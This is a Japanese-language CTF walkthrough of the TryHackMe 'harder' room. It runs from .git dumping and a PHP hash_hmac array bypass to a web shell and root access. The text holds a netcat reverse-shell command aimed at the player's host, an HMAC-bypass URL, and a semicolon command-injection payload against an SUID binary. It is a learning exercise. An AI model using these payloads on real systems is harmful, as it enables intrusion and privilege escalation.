# harder CTF

https://tryhackme.com/room/harder

## Enumeration

```shell
TARGET=10.201.117.128
sudo bash -c "echo $TARGET   harder.thm >> /etc/hosts"
```

### ポートスキャン

```sh
rustscan -a $TARGET

PORT   STATE SERVICE     REASON
2/tcp  open  compressnet syn-ack ttl 60
22/tcp open  ssh         syn-ack ttl 59
80/tcp open  http        syn-ack ttl 59
```

```sh
$ nmap -sV -vv -p2,22,80 $TARGET

PORT   STATE SERVICE REASON         VERSION
2/tcp  open  ssh     syn-ack ttl 60 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
22/tcp open  ssh     syn-ack ttl 59 OpenSSH 8.3 (protocol 2.0)
80/tcp open  http    syn-ack ttl 59 nginx 1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSH,HTTP。SSHが2つある理由は不明。

### ディレクトリ列挙

phpinfo.php を発見

```sh
$ dirsearch -u http://harder.thm

[09:31:54] 200 -   85KB - /phpinfo.php
```

vendorディレクトリを発見。ブラウザでアクセスすると、http://harder.thm:8080/vendor/ に転送される。

```sh
dirb http://$TARGET
```

応答で次のクッキーがセットされていることが分かる。pwd.harder.local を hostsに追加。

```http
Set-Cookie: TestCookie=just+a+test+cookie; expires=Fri, 15-Aug-2025 01:25:34 GMT; Max-Age=3600; path=/; domain=pwd.harder.local; secure
```

## pwd.harder.local

アクセスすると、ログイン画面が表示される。

### git

git系のファイルが見つかる。

```sh
$ ffuf -u http://pwd.harder.local/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fs 1985

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://pwd.harder.local/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1985
________________________________________________

.gitignore              [Status: 200, Size: 27, Words: 1, Lines: 3, Duration: 184ms]
.git                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 184ms]
.git/index              [Status: 200, Size: 361, Words: 3, Lines: 3, Duration: 185ms]
.git/config             [Status: 200, Size: 92, Words: 9, Lines: 6, Duration: 189ms]
.git/logs/              [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 188ms]
.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2, Duration: 186ms]
index.php               [Status: 200, Size: 19926, Words: 526, Lines: 24, Duration: 187ms]
:: Progress: [4744/4744] :: Job [1/1] :: 222 req/sec :: Duration: [0:00:22] :: Errors: 0 ::
```

```sh
$ cat .gitignore            
credentials.php
secret.php
```

https://github.com/internetwache/GitTools でダンプ

```sh
$ /home/kali/tools/GitTools/Dumper/gitdumper.sh http://pwd.harder.local/.git/ ./git
```

```sh
$ git log 
commit 9399abe877c92db19e7fc122d2879b470d7d6a58 (HEAD -> master)
Author: evs <evs@harder.htb>
Date:   Thu Oct 3 18:12:23 2019 +0300

    add gitignore

commit 047afea4868d8b4ce8e7d6ca9eec9c82e3fe2161
Author: evs <evs@harder.htb>
Date:   Thu Oct 3 18:11:32 2019 +0300

    add extra security

commit ad68cc6e2a786c4e671a6a00d6f7066dc1a49fc3
Author: evs <evs@harder.htb>
Date:   Thu Oct 3 14:00:52 2019 +0300

    added index.php
```

extra security

```php
diff --git a/auth.php b/auth.php
deleted file mode 100644
index 228694f..0000000
--- a/auth.php
+++ /dev/null
@@ -1,131 +0,0 @@

-<?php
-define('LOGIN_USER', "admin");
-define('LOGIN_PASS', "admin");
-
-define('LOGOUT_COMPLETE', "You've been successfully logged out.");
-define('INCORRECT_USERNAME_PASSWORD', "Invalid login credentials!");
-define('STARTER_GREETING', "Harder Corp. - Password Manager");
-define('USERNAME', "Username");
-define('PASSWORD', "Password");
-define('ENTER_USERNAME', "Enter Username");
-define('ENTER_PASSWORD', "Enter Password");
-define('REMEMBER_THIS_COMPUTER', "Remember this computer");
-define('BUTTON_LOGIN', "Log in &rarr;");
-
-// ================================================================================================
-// ### DO NOT TOUCH ANYTHING BELOW THIS LINE ###
-// ================================================================================================
-

-class Login {
-       // unique prefix that is used with this object (on cookies and password salt)
-       var $prefix = "login_";
-       // days "remember me" cookies will remain
-       var $cookie_duration = 21;
-       // temporary values for comparing login are auto set here. do not set your own $user or $pass here
-       var $user = "";
-       var $pass = "";
-
-  function authorize() {
-       //save cookie info to session
-       if(isset($_COOKIE[$this->prefix.'user'])){
-               $_SESSION[$this->prefix.'user'] = $_COOKIE[$this->prefix.'user'];
-               $_SESSION[$this->prefix.'pass'] = $_COOKIE[$this->prefix.'pass'];
-       }
-
-       //if setting vars
-       if(isset($_POST['action']) && $_POST['action'] == "set_login"){
-
-               $this->user = $_POST['user'];
-               $this->pass = md5($this->prefix.$_POST['pass']); //hash password. salt with prefix
-
-               $this->check();//dies if incorrect
-
-               //if "remember me" set cookie
-               if(isset($_POST['remember'])){
-                       setcookie($this->prefix."user", $this->user, time()+($this->cookie_duration*86400));// (d*24h*60m*60s)
-                       setcookie($this->prefix."pass", $this->pass, time()+($this->cookie_duration*86400));// (d*24h*60m*60s)
-               }
-
-               //set session
-               $_SESSION[$this->prefix.'user'] = $this->user;
-               $_SESSION[$this->prefix.'pass'] = $this->pass;
-       }
-
-       //if forced log in
-       elseif(isset($_GET['action']) && $_GET['action'] == "prompt"){
-               session_unset();
-               session_destroy();
-               //destroy any existing cookie by setting time in past
-               if(!empty($_COOKIE[$this->prefix.'user'])) setcookie($this->prefix."user", "blanked", time()-(3600*25));
-               if(!empty($_COOKIE[$this->prefix.'pass'])) setcookie($this->prefix."pass", "blanked", time()-(3600*25));
-
-               $this->prompt();
-       }
-
-       //if clearing the login
-       elseif(isset($_GET['action']) && $_GET['action'] == "clear_login"){
-               session_unset();
-               session_destroy();
-               //destroy any existing cookie by setting time in past
-               if(!empty($_COOKIE[$this->prefix.'user'])) setcookie($this->prefix."user", "blanked", time()-(3600*25));
-               if(!empty($_COOKIE[$this->prefix.'pass'])) setcookie($this->prefix."pass", "blanked", time()-(3600*25));
-
-               $msg = '<span class="green">'.LOGOUT_COMPLETE.'</span>';
-               $this->prompt($msg);
-       }
-
-       //prompt for
-       elseif(!isset($_SESSION[$this->prefix.'pass']) || !isset($_SESSION[$this->prefix.'user'])){
-               $this->prompt();
-       }
-
-       //check the pw
-       else{
-               $this->user = $_SESSION[$this->prefix.'user'];
-               $this->pass = $_SESSION[$this->prefix.'pass'];
-               $this->check();//dies if incorrect
-       }
-
-}
-
-function check(){
-
-       if(md5($this->prefix . LOGIN_PASS) != $this->pass || LOGIN_USER != $this->user){
-               //destroy any existing cookie by setting time in past
-               if(!empty($_COOKIE[$this->prefix.'user'])) setcookie($this->prefix."user", "blanked", time()-(3600*25));
-               if(!empty($_COOKIE[$this->prefix.'pass'])) setcookie($this->prefix."pass", "blanked", time()-(3600*25));
-               session_unset();
-               session_destroy();
-
-               $msg='<span class="red">'.INCORRECT_USERNAME_PASSWORD.'</span>';
-               $this->prompt($msg);
-       }
-}
-
-function prompt($msg=''){
-?>
```

- admin/admin でログイン可能。

```php
diff --git a/hmac.php b/hmac.php
deleted file mode 100644
index 66428e3..0000000
--- a/hmac.php
+++ /dev/null
@@ -1,18 +0,0 @@

-<?php
-if (empty($_GET['h']) || empty($_GET['host'])) {
-   header('HTTP/1.0 400 Bad Request');
-   print("missing get parameter");
-   die();
-}
-require("secret.php"); //set $secret var
-if (isset($_GET['n'])) {
-   $secret = hash_hmac('sha256', $_GET['n'], $secret);
-}
-
-$hm = hash_hmac('sha256', $_GET['host'], $secret);
-if ($hm !== $_GET['h']){
-  header('HTTP/1.0 403 Forbidden');
-  print("extra security check failed");
-  die();
-}
-?>
```

- h, host パラメータ必須
- hostのハッシュ計算結果とhを一致させる必要がある
- n パラメータでハッシュ化を一段回増やせる

```php
diff --git a/index.php b/index.php
deleted file mode 100644
index 6e1096e..0000000
--- a/index.php
+++ /dev/null
@@ -1,20 +0,0 @@

-<?php
-  session_start();
-  require("auth.php");
-  $login = new Login;
-  $login->authorize();
-  require("hmac.php");
-  require("credentials.php");
-?> 
-  <table style="border: 1px solid;">
-     <tr>
-       <td style="border: 1px solid;">url</td>
-       <td style="border: 1px solid;">username</td>
-       <td style="border: 1px solid;">password (cleartext)</td>
-     </tr>
-     <tr>
-       <td style="border: 1px solid;"><?php echo $creds[0]; ?></td>
-       <td style="border: 1px solid;"><?php echo $creds[1]; ?></td>
-       <td style="border: 1px solid;"><?php echo $creds[2]; ?></td>
-     </tr>
-   </table>
```

- hmac.php のエラーを回避すれば、クレデンシャルが表示される実装。

## hmac

このセキュリティをバイパスする方法が必要。

```php
require("secret.php"); //set $secret var
if (isset($_GET['n'])) {
   $secret = hash_hmac('sha256', $_GET['n'], $secret);
}

$hm = hash_hmac('sha256', $_GET['host'], $secret);
if ($hm !== $_GET['h']){
  header('HTTP/1.0 403 Forbidden');
  print("extra security check failed");
  die();
}
```

全く分からなかったのでここはウォークスルーを見た。下記のバグチャレンジと同じ内容とのこと。

https://www.securify.nl/blog/spot-the-bug-challenge-2018-warm-up/

hash_hmacの第二引数に配列を渡すと、NULLを返す実装を悪用する。この危険性は[ドキュメント](https://www.php.net/manual/ja/function.hash-hmac.php)でも言及されていた。

第三引数にNULL（falseでも同じ）を渡すことで、ハッシュ値を計算できる。

```php
<?php
$a = hash_hmac('sha256', "harder", false);
echo $a;
echo "\n";
$b = hash_hmac('sha256', "harder", NULL);
echo $b;
?>   
```

```sh
$ php ./test.php

741f6f564c892d969e6c536e4aac60dd83e5ea3aa357789684164b0d87a6f1f4
741f6f564c892d969e6c536e4aac60dd83e5ea3aa357789684164b0d87a6f1f4
```

次のURLでWebシェルページの認証情報が表示される。配列の渡し方がポイント。

```sh
http://pwd.harder.local/index.php?n[]=1&host=harder&h=741f6f564c892d969e6c536e4aac60dd83e5ea3aa357789684164b0d87a6f1f4
```

http://shell.harder.local にログイン後、ブラウザのエクステンションで X-Forwarded-For を 10.10.10.1 に設定すると、Webシェルが表示された。

## shell

user.txt を入手

```sh
cat /home/evs/user.txt
```

リバースシェル取得

```sh
busybox nc 10.11.146.32 6666 -e sh
```

## 権限昇格

dockerコンテナであると思われる。

```sh
ps aux
PID   USER     TIME  COMMAND
    1 root      0:00 {supervisord} /usr/bin/python3 /usr/bin/supervisord -c /etc/supervisor/conf.d/supervisord.conf
    8 root      0:00 nginx: master process nginx -g daemon off;
    9 root      0:00 {php-fpm7} php-fpm: master process (/etc/php7/php-fpm.conf)
   10 root      0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
   11 www       0:00 nginx: worker process
  270 www       0:00 {php-fpm7} php-fpm: pool www
  271 www       0:00 sh
  288 www       0:00 {php-fpm7} php-fpm: pool www
  290 www       0:00 ps aux
```

cron

```sh
ls -al /etc/periodic/*/
/etc/periodic/15min/:
total 12
drwxr-xr-x    1 root     root          4096 Jul  7  2020 .
drwxr-xr-x    1 root     root          4096 May 29  2020 ..
-rwxr-xr-x    1 www      www            190 Jul  6  2020 evs-backup.sh
```

evsユーザーのSSH接続情報を入手

```sh
cat /etc/periodic/15min/evs-backup.sh
#!/bin/ash

# ToDo: create a backup script, that saves the /www directory to our internal server
# for authentication use ssh with user "evs" and password "[REDACTED]"
```

```sh
ssh evs@10.201.62.106
```

shファイルを検索

```sh
harder:~$ find / -name '*.sh' 2>/dev/null
/usr/bin/findssl.sh
/usr/local/bin/run-crypted.sh
/etc/periodic/15min/evs-backup.sh
```

run-crypted.sh。暗号化されたコマンドファイルを実行するツール。

```sh
harder:~$ cat /usr/local/bin/run-crypted.sh
#!/bin/sh

if [ $# -eq 0 ]
  then
    echo -n "[*] Current User: ";
    whoami;
    echo "[-] This program runs only commands which are encypted for root@harder.local using gpg."
    echo "[-] Create a file like this: echo -n whoami > command"
    echo "[-] Encrypt the file and run the command: execute-crypted command.gpg"
  else
    export GNUPGHOME=/root/.gnupg/
    gpg --decrypt --no-verbose "$1" | ash
fi
```

execute-cryptedにSUIDが付いている。

```sh
harder:~$ which execute-crypted
/usr/local/bin/execute-crypted

harder:~$ ls -al /usr/local/bin/execute-crypted
-rwsr-x---    1 root     evs          19960 Jul  6  2020 /usr/local/bin/execute-crypted
```

リバース。単純にrun-crypted.shを呼んでいるだけだが、コマンドインジェクションに対して脆弱な可能性がある。

```c
undefined8 main(int param_1,long param_2)
{
  long in_FS_OFFSET;
  char *local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setuid(0);
  if (param_1 == 2) {
    asprintf(&local_18,"/usr/local/bin/run-crypted.sh %s",*(undefined8 *)(param_2 + 8));
    system(local_18);
    free(local_18);
  }
  else {
    system("/usr/local/bin/run-crypted.sh");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

引数としてコマンドインジェクションのペイロードを渡すとルートフラグを取れた。

```sh
harder:~$ execute-crypted ';cat /root/root.txt'
[*] Current User: root
[-] This program runs only commands which are encypted for root@harder.local using gpg.
[-] Create a file like this: echo -n whoami > command
[-] Encrypt the file and run the command: execute-crypted command.gpg
[REDACTED]
```


## 振り返り

- http上のgitをダンプする方法を学べたのが一番良かった
- hash_hmacも勉強になったが、バグチャレンジ上のレベルが「ウォームアップ」扱いなのは少しショック
- ウォークスルーなどによると、最後の権限昇格は、公開鍵をインポートしてからツールを実行するという方法が本筋だったらしい

```sh
find / -name "root@harder*" 2>/dev/null

gpg --import /var/backup/root@harder.local.pub
echo "cat /root/root.txt" > cmd
gpg --recipient root@harder.local cmd
/usr/local/bin/execute-crypted cmd.gpg
```
